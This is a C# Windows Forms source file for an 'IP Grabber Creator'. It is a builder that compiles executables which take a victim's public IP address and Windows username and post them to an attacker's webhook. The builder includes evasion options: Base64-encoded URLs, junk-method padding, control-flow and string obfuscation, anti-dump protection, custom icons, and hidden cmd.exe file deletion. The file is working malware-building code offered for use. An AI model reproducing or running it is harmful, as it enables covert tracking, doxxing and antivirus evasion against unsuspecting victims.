using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Drawing;
using System.Windows.Forms;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using dnlib.DotNet;
using System.IO;
namespace IP_Grabber
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public static string BR()
        {
            return Environment.NewLine;
        }
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }
        public string code { get; set; }

        public string url { get; set; }
        void Compile()
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            this.Text = "IP Grabber Creator | Compiling... | By Kye";
            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            ICodeCompiler icc = codeProvider.CreateCompiler();
            string Output = nameSpace.Text + ".exe";
            url = webhook.Text;
            string encoded = Base64Encode(webhook.Text);
            if (encode1.Checked)
            {
                url = "AZXC(\"" + encoded + "\")";
                api = "AZXC(\"" + Base64Encode("http://ip-api.com/line/?fields=8192") + "\")";
            }
            else
            {
                url = "\"" + webhook.Text + "\"";
                api = "\"" + "http://ip-api.com/line/?fields=8192" + "\"";
            }
            textBox2.Text = "";
            CompilerParameters parameters = new CompilerParameters();
            //Make sure we generate an EXE, not a DLL
            parameters.GenerateExecutable = true;
            if (!obfbox.Checked)
            {
                //If not obfuscating
                parameters.OutputAssembly = Output;
            }
            else
            {
                //If obfuscating
                parameters.OutputAssembly = Output + "_243789.exe";
            }

            
            parameters.ReferencedAssemblies.Add("System.Net.dll");
            parameters.ReferencedAssemblies.Add("System.Collections.Specialized.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("mscorlib.dll");
            parameters.CompilerOptions = "/optimize";
            if (textBox3.Text != "")
            {
                parameters.CompilerOptions = @"/win32icon:" + "\"" + openFileDialog1.FileName + "\"";
            }
            string namespace2 = nameSpace.Text.Replace(" ", "_");
            code = "using System;" + BR();
            code += "using System.Net;" + BR();
            code += "using System.Collections.Specialized;" + BR();
            code += "namespace " + namespace2 + BR();
            code += "{" + BR();
            code += "    class " + namespace2 + "Class" + BR();
            code += "    {" + BR();

            if (junkBox.Checked)
            {
                int hundred = 250;
                while (hundred > 0)
                {
                    hundred--;
                    code += "public static void " + RandomString(6) + "() {}" + BR();
                    code += "public static string " + RandomString(6) + "() { return null; }" + BR();
                    code += "private static string " + RandomString(6) + "() { return null; }" + BR();
                    code += "public static int " + RandomString(6) + "() { return 0; }" + BR();
                    code += "public static class " + RandomString(6) + " {}" + BR();
                    code += "public static byte[] " + RandomString(6) + " = {0};" + BR();
                    if (hundred == 80)
                    {
                        InsertMain();
                    }
                }
            }
            else
            {
                InsertMain();
            }
            if (encode1.Checked)
            {
                code += "public static string AZXC(string a) {" + BR();
                code += "var base64EncodedBytes = System.Convert.FromBase64String(a);" + BR();
                code += "return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);" + BR();
                code += "}" + BR();
            }

                code += "    }" + BR();
            code += "}" + BR();

            textBox1.Text = code;


            CompilerResults results = icc.CompileAssemblyFromSource(parameters, textBox1.Text);

            if (results.Errors.Count > 0)
            {
                textBox2.ForeColor = Color.Red;
                
                foreach (CompilerError CompErr in results.Errors)
                {
                    textBox2.Text += "Line number " + CompErr.Line + ", Error Number: " + CompErr.ErrorNumber +", '" + CompErr.ErrorText + ";" + Environment.NewLine;
                }
                MessageBox.Show(results.Errors.Count.ToString() + " errors occured, check the log for more info", "IP Grabber Creator | Kye", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                textBox2.ForeColor = Color.MediumBlue;
                stopwatch.Start();
                //Successful Compile
                
                textBox2.Text = "Compiled " + Output + " in " + stopwatch.ElapsedMilliseconds + "ms";
                textBox1.Text = code;
                this.Text = "IP Grabber Creator | By Kye";
                if (obfbox.Checked)
                {
                    var module = ModuleDefMD.Load(Output + "_243789.exe");
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.String(module);
                    ObfProtection.Calli(module);
                    AntiDumpExecute.AntiDumpExecuteE(module);
                    ControlFlowObfuscation.Execute(module);
                    ControlFlowObfuscation.Execute(module);
                        
                    module.Write(nameSpace.Text + ".exe");

                    //Deletes file with cmd coz for some reason File.Delete didnt have access
                        ProcessStartInfo info = new ProcessStartInfo("cmd.exe");
                        info.Arguments = "/k del " + "\"" + Output + "_243789.exe\"";
                        info.CreateNoWindow = true;
                    info.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(info);
                    Thread.Sleep(100);
                    foreach (var process in Process.GetProcessesByName("cmd"))
                    {
                            process.Kill();
                    }
                } 
            }
        }
        public string api { get; set; }
        string valuename = RandomString(5);
        void InsertMain()
        {
            
            code += "         static void Main()" + BR();
            code += "        {" + BR();
            code += "            using (WebClient web = new System.Net.WebClient())" + BR();
            code += "            {" + BR();
            code += "                NameValueCollection " + valuename + " = new NameValueCollection();" + BR();
            code += "                " + valuename + ".Add(\"username\", \"Kye's Servant\");" + BR();
            code += "                " + valuename + ".Add(\"avatar_url\", \"https://i.imgur.com/PRgWqUn.gif\");" + BR();
            code += "                " + valuename + ".Add(\"content\", Environment.UserName + \"'s IP: \" + web.DownloadString(" + api + "));" + BR();
            code += "                web.UploadValues(" + url + ", " + valuename + ");" + BR();
            code += "            }" + BR();
            code += "        }" + BR();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string[] numbers = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", " ", "(", ")"};
            foreach (string x in numbers)
            {
                if (nameSpace.Text.StartsWith(x))
                {
                    MessageBox.Show("Namespace cannot start with a number or a space!", "IP Grabber Creator | By Kye", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    nameSpace.Focus();
                    return;
                }
            }

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    string urlcheck = webClient.DownloadString(webhook.Text);
                }
            }
            catch
            {
                MessageBox.Show("That's not a valid webhook url!", "IP Grabber Creator | By Kye", MessageBoxButtons.OK, MessageBoxIcon.Error);
                webhook.Focus();
                return;
            }
            Thread thread = new Thread(Compile);
            thread.Start();
        }

        
        public bool ViewedCode { get; set; }
        private void button3_Click(object sender, EventArgs e)
        {
            
            if (ViewedCode == false)
            {
                this.Size = new Size(751, 770);
                ViewedCode = true;
                return;
            }
            if (ViewedCode == true)
            {
                this.Size = new Size(751, 472);
                ViewedCode = false;
                return;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "ico file (*.ico)|*.ico";
            openFileDialog1.ShowDialog();
            textBox3.Text = openFileDialog1.FileName;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ViewedCode = false;
        }
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            if (textBox3.Text == "openFileDialog1")
            {
                textBox3.Clear();
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var process in Process.GetProcessesByName("cmd.exe"))
            {
                process.Kill();
            }
        }
    }
}
